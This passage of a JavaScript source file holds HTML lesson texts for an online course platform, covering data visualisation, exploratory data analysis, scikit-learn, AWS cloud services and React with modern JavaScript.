  39: `<p>Data visualisation transforms numbers into visual insights that are immediately understandable. Matplotlib is the foundational plotting library — highly customisable but verbose. Seaborn builds on Matplotlib with a higher-level API and beautiful default styles, making statistical plots (box plots, violin plots, pair plots, heat maps) trivial to create.</p>
<p>A good visualisation communicates one clear insight. Choose your chart type based on what you are showing: bar charts for comparing categories, line charts for trends over time, scatter plots for relationships between two variables, and histograms for distributions. Always label your axes, include a title, and choose colour palettes accessible to colour-blind readers.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Figure and Axes:</strong> Matplotlib's hierarchy — a Figure is the whole image; Axes is an individual plot within it.</li>
<li><strong>Seaborn heatmap:</strong> Visualises a correlation matrix — shows which features are linearly related.</li>
<li><strong>Histogram:</strong> Shows the distribution of a single numerical variable by counting values in bins.</li>
<li><strong>Pair plot:</strong> A grid of scatter plots for every pair of features — great for quick exploratory analysis.</li>
</ul>`,

  40: `<p>Exploratory Data Analysis (EDA) is the first thing you do with any new dataset — before building models. The goal is to understand the data's structure, find anomalies, test assumptions, and generate hypotheses. EDA saves enormous time by revealing data quality issues early, before they corrupt model results and send you on a long debugging chase.</p>
<p>Outliers are data points that differ significantly from the rest. They can indicate genuine rare events (fraud, sensor failures) or data entry errors. The IQR method identifies outliers as points more than 1.5 × IQR below the first quartile or above the third quartile. Always investigate outliers before removing them — they often contain important information.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>describe():</strong> Pandas function that gives count, mean, std, min, quartiles, and max for numerical columns.</li>
<li><strong>Correlation:</strong> A value between -1 and 1 indicating the linear relationship between two variables.</li>
<li><strong>IQR (Interquartile Range):</strong> Q3 - Q1 — the middle 50% of the data; used to detect outliers.</li>
<li><strong>Skewness:</strong> Asymmetry in the distribution — a long right tail means positive skew; may require log transformation.</li>
</ul>`,

  41: `<p>Scikit-learn is Python's go-to machine learning library, providing a consistent API across dozens of algorithms. Every estimator follows the same pattern: instantiate the model, call <code>fit(X_train, y_train)</code> to train it, then call <code>predict(X_test)</code> to generate predictions. Pipelines chain preprocessing and modelling steps, preventing data leakage and simplifying cross-validation.</p>
<p>Cross-validation gives a more reliable performance estimate than a single train/test split by training and evaluating the model on multiple different splits of the data. k-fold cross-validation splits data into k equal parts, trains on k-1 folds, and tests on the remaining fold — repeating k times and averaging the scores. This reduces the risk of getting lucky or unlucky with your random split.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>fit() / predict():</strong> The universal scikit-learn interface — all models use the same method names.</li>
<li><strong>Pipeline:</strong> Chains transformers and a final estimator to prevent data leakage during cross-validation.</li>
<li><strong>k-fold cross-validation:</strong> Evaluates a model on k different splits to produce a reliable performance estimate.</li>
<li><strong>ROC-AUC:</strong> Area Under the ROC Curve — measures a classifier's ability to distinguish between classes across all thresholds.</li>
</ul>`,

  // ── Course 8: Cloud Computing & AWS ──────────────────────────────────
  42: `<p>Cloud computing delivers computing resources — servers, storage, databases, networking — over the internet on a pay-as-you-go basis. Instead of buying and maintaining physical hardware, you rent exactly the capacity you need and scale up or down in minutes. AWS (Amazon Web Services) is the market leader, running a significant portion of the internet including Netflix, Airbnb, and NASA.</p>
<p>IAM (Identity and Access Management) controls who can do what in your AWS account. Every action in AWS is an API call that must be authorised by an IAM policy. The principle of least privilege — granting only the minimum permissions needed to do a job — is the single most important security practice in cloud environments. A misconfigured IAM policy has been the root cause of many high-profile cloud data breaches.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>IaaS:</strong> Infrastructure as a Service — you manage OS and above; AWS manages hardware (e.g. EC2).</li>
<li><strong>PaaS:</strong> Platform as a Service — you manage your app; provider manages runtime and infrastructure (e.g. Heroku).</li>
<li><strong>IAM Role:</strong> A set of permissions that can be assumed by a service or user — prefer roles over access keys.</li>
<li><strong>Least privilege:</strong> Grant only the permissions required for a task — nothing more.</li>
</ul>`,

  43: `<p>EC2 (Elastic Compute Cloud) provides resizable virtual machines in the cloud. You choose the instance type (CPU, RAM, network performance), operating system, and storage. Security Groups act as virtual firewalls — they control which ports and IPs can communicate with your instance, and all traffic is denied by default until you explicitly allow it.</p>
<p>A VPC (Virtual Private Cloud) is your private, isolated section of the AWS network. Inside a VPC you create subnets in different Availability Zones for fault tolerance. Public subnets route traffic through an Internet Gateway; private subnets use a NAT Gateway to initiate outbound traffic without being directly reachable from the internet — protecting databases and internal services.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Security Group:</strong> A stateful virtual firewall for EC2 — defines allowed inbound and outbound traffic.</li>
<li><strong>AMI (Amazon Machine Image):</strong> A template containing the OS and software configuration for launching EC2 instances.</li>
<li><strong>Public subnet:</strong> A subnet with a route to the Internet Gateway — instances here can be accessed from the internet.</li>
<li><strong>NAT Gateway:</strong> Allows private-subnet instances to make outbound internet requests without being publicly accessible.</li>
</ul>`,

  44: `<p>S3 (Simple Storage Service) is AWS's object storage service — you store any file (object) in a bucket and retrieve it via a URL. S3 is highly durable (designed for 99.999999999% durability), infinitely scalable, and cheap. It powers static website hosting, data lakes, application file uploads, and serves as the backbone for many AWS services including data pipelines and machine learning workflows.</p>
<p>S3 storage classes let you balance cost and access speed. Standard is for frequently accessed data. Infrequent Access and Glacier archive tiers offer significant cost savings (up to 90% cheaper) for data accessed rarely. Lifecycle policies automatically transition objects between storage classes based on age, keeping storage costs optimised without manual management.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Bucket:</strong> A globally unique container for S3 objects — all objects live inside a bucket.</li>
<li><strong>Object:</strong> A file stored in S3, identified by its key (path-like name) within a bucket.</li>
<li><strong>Storage class:</strong> Determines durability, availability, and price — choose based on how often data is accessed.</li>
<li><strong>Pre-signed URL:</strong> A temporary URL granting time-limited access to a private S3 object — great for secure file downloads.</li>
</ul>`,

  45: `<p>RDS (Relational Database Service) lets you run MySQL, PostgreSQL, MariaDB, Oracle, or SQL Server without managing the underlying server. AWS handles patching, backups, and hardware failure. Multi-AZ deployments automatically maintain a synchronous standby replica in a second Availability Zone, providing automatic failover in case the primary instance fails.</p>
<p>Read replicas are asynchronous copies of your database that can serve read traffic — critical for read-heavy applications that would otherwise bottleneck on a single instance. Aurora is AWS's cloud-native database engine that is compatible with MySQL and PostgreSQL but offers significantly higher performance and automatic storage scaling.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Multi-AZ:</strong> Synchronous standby in a second AZ — provides automatic failover with minimal downtime.</li>
<li><strong>Read replica:</strong> Asynchronous copy of the DB for read-only queries — offloads read traffic from the primary.</li>
<li><strong>Automated backups:</strong> RDS takes daily snapshots and stores transaction logs for point-in-time recovery.</li>
<li><strong>Parameter group:</strong> A container for database engine configuration — tune memory, connections, and timeouts.</li>
</ul>`,

  46: `<p>AWS Lambda runs your code in response to events (HTTP requests, S3 uploads, database changes, scheduled triggers) without you provisioning or managing any servers. You pay only for the actual compute time used — down to the millisecond. Lambda automatically scales from zero to thousands of concurrent executions, making it ideal for unpredictable or bursty workloads.</p>
<p>Cold starts occur when Lambda needs to initialise a new execution environment — this can add 100ms–1s of latency to the first invocation. Keeping functions warm with scheduled pings, using smaller deployment packages, and writing functions in Node.js or Python (which have shorter cold starts than Java or .NET) are common optimisation strategies.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Event-driven:</strong> Lambda functions execute in response to triggers — not continuously running servers.</li>
<li><strong>Cold start:</strong> Latency added when Lambda initialises a new container for the first invocation.</li>
<li><strong>Execution role:</strong> An IAM role granting the Lambda function permissions to access other AWS services.</li>
<li><strong>API Gateway:</strong> A managed service that routes HTTP requests to Lambda functions — creates a serverless REST API.</li>
</ul>`,

  47: `<p>Elastic Beanstalk is a PaaS that automatically handles the deployment, capacity provisioning, load balancing, and monitoring of your application. You push your code and Beanstalk figures out the rest — useful for teams that want the flexibility of EC2 without the operational overhead. CloudFormation takes this further with Infrastructure as Code — you define your entire stack in a YAML or JSON template and AWS creates or updates it automatically.</p>
<p>Cloud costs can spiral quickly without active management. AWS Cost Explorer visualises spending patterns. Reserved Instances offer up to 72% discount over on-demand pricing for committed one or three-year usage. Spot Instances leverage AWS's spare capacity at up to 90% discount — ideal for fault-tolerant batch workloads that can handle interruption.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Elastic Beanstalk:</strong> Upload your app code and AWS handles the underlying infrastructure automatically.</li>
<li><strong>CloudFormation:</strong> Define all your AWS resources in a template file — infrastructure as code.</li>
<li><strong>Reserved Instance:</strong> Commit to 1 or 3 years of usage for up to 72% discount over on-demand pricing.</li>
<li><strong>Spot Instance:</strong> Unused EC2 capacity at up to 90% discount — can be interrupted with 2 minutes notice.</li>
</ul>`,

  // ── Course 9: React & Modern JavaScript ──────────────────────────────
  48: `<p>ES6 (released 2015) and subsequent versions transformed JavaScript from a scripting language into a powerful, expressive programming language. Arrow functions provide concise syntax and lexically bind <code>this</code> — eliminating one of JavaScript's most confusing quirks. Destructuring lets you extract values from objects and arrays in a single concise statement.</p>
<p>The module system (<code>import</code> / <code>export</code>) replaced the old pattern of polluting the global scope. Modules are the foundation of modern JavaScript bundlers like Vite and webpack, enabling tree-shaking (removing unused code) to keep bundle sizes small. Optional chaining (<code>?.</code>) and nullish coalescing (<code>??</code>) make defensive coding dramatically cleaner.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Arrow function:</strong> <code>const add = (a, b) => a + b</code> — shorter syntax and lexically bound <code>this</code>.</li>
<li><strong>Destructuring:</strong> <code>const { name, age } = user</code> — extract values from objects/arrays in one line.</li>
<li><strong>Optional chaining (<code>?.</code>):</strong> Access nested properties safely — returns undefined instead of throwing an error.</li>
<li><strong>Spread operator:</strong> <code>{ ...obj, newProp: val }</code> — creates a shallow copy with added or overridden properties.</li>
</ul>`,

  49: `<p>React is a library for building user interfaces from small, reusable pieces called components. Each component is a JavaScript function that returns JSX — a syntax that looks like HTML but is actually JavaScript. React maintains a virtual DOM (an in-memory copy of the real DOM) and updates only the parts of the page that actually changed, making UI updates efficient even in complex applications.</p>
<p>Props (properties) are how parent components pass data down to children — they are read-only inside the child. Lists of elements must include a <code>key</code> prop so React can track which items changed, were added, or were removed. Composition — building complex UIs from small, single-responsibility components — is the core architectural pattern in React.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>JSX:</strong> HTML-like syntax compiled to <code>React.createElement()</code> calls — not a template language, it is JavaScript.</li>
<li><strong>Props:</strong> Read-only data passed from parent to child component.</li>
<li><strong>Key prop:</strong> A unique identifier on list items that helps React efficiently update lists.</li>
<li><strong>Conditional rendering:</strong> Render different UI based on state — use <code>&&</code> for simple cases, ternary for if/else.</li>
</ul>`,

  50: `<p>Hooks are functions that let you use React features inside functional components. <code>useState</code> gives a component local state — when state changes, React re-renders the component. <code>useEffect</code> handles side effects (data fetching, subscriptions, timers) and runs after the component renders. Its cleanup function prevents memory leaks from subscriptions that outlive the component.</p>
<p>Custom hooks let you extract and reuse stateful logic across multiple components. A hook that fetches data, manages loading/error states, and returns the result can be shared between any component that needs it — without duplicating code. The rules of hooks are strict: only call hooks at the top level of a component or custom hook, never inside loops, conditions, or nested functions.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>useState:</strong> Returns <code>[value, setValue]</code> — calling <code>setValue</code> triggers a re-render with the new value.</li>
<li><strong>useEffect dependency array:</strong> Controls when the effect runs — empty <code>[]</code> means run once on mount only.</li>
<li><strong>useMemo:</strong> Memoises an expensive computed value — recalculates only when dependencies change.</li>
<li><strong>Custom hook:</strong> A function starting with "use" that calls other hooks — reusable stateful logic.</li>
</ul>`,

  51: `<p>React Router v6 enables client-side routing — navigating between pages without a full browser reload. Routes are declared with <code>&lt;Route&gt;</code> components; the URL determines which component renders. Dynamic segments (<code>/users/:id</code>) are accessed with the <code>useParams</code> hook. The <code>useNavigate</code> hook provides programmatic navigation — redirect after login, for example.</p>
<p>Fetching data from an API is a core skill in React. The <code>useEffect</code> hook fires after render, making it the right place for API calls. Always manage three states: loading (show a spinner), success (show the data), and error (show a message). React Query improves on manual data fetching by adding caching, background refetching, and automatic loading/error states.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>React Router v6:</strong> Uses <code>&lt;Routes&gt;</code> and <code>&lt;Route&gt;</code> components to map URLs to components.</li>
<li><strong>useParams:</strong> Returns URL parameters from dynamic route segments like <code>/courses/:id</code>.</li>
<li><strong>useNavigate:</strong> Programmatic navigation — call <code>navigate('/dashboard')</code> after a successful action.</li>
<li><strong>React Query:</strong> Manages server state — caching, background updates, and loading/error states out of the box.</li>
</ul>`,

  52: `<p>As applications grow, passing props through many layers of components ("prop drilling") becomes unwieldy. Context API solves this by creating a global value accessible to any component in the tree without passing it through every intermediate component. It is ideal for data that many components need — current user, theme, language preference.</p>
<p>Redux Toolkit (RTK) is the recommended way to use Redux — a predictable state container for large applications. State lives in a central store; components read from it via selectors and dispatch actions to modify it. RTK Query extends Redux Toolkit with a powerful data fetching and caching layer that eliminates much of the boilerplate of manual API integration.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Context API:</strong> Broadcasts a value to all components within a Provider without prop drilling.</li>
<li><strong>useReducer:</strong> Manages complex state transitions with a pure reducer function — like useState for complex state.</li>
<li><strong>Redux slice:</strong> An RTK concept grouping a reducer and its action creators together in one place.</li>
<li><strong>Selector:</strong> A function that reads and derives values from the Redux store — memoised with reselect for performance.</li>
</ul>`,

  53: `<p>Testing gives you confidence that your code works correctly and that future changes do not break existing features. React Testing Library (RTL) encourages testing from the user's perspective — interacting with elements by their accessible role or text rather than implementation details like CSS classes or component state. This makes tests resilient to refactoring.</p>
<p>Vite has largely replaced Create React App for new projects — it is dramatically faster in development thanks to native ES modules and only bundling what is actually imported. When deploying to production, Vite creates an optimised bundle with code splitting and tree-shaking. Platforms like Netlify and Vercel deploy React apps automatically from GitHub with zero configuration.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>React Testing Library:</strong> Renders components in a virtual DOM and queries them the way a user would interact.</li>
<li><strong>jest.fn():</strong> Creates a mock function to verify it was called with the correct arguments.</li>
<li><strong>Code splitting:</strong> Breaks the bundle into chunks loaded on demand — improves initial page load time.</li>
<li><strong>Tree shaking:</strong> Removes unused exported code during the build — keeps the final bundle small.</li>
</ul>`,
};
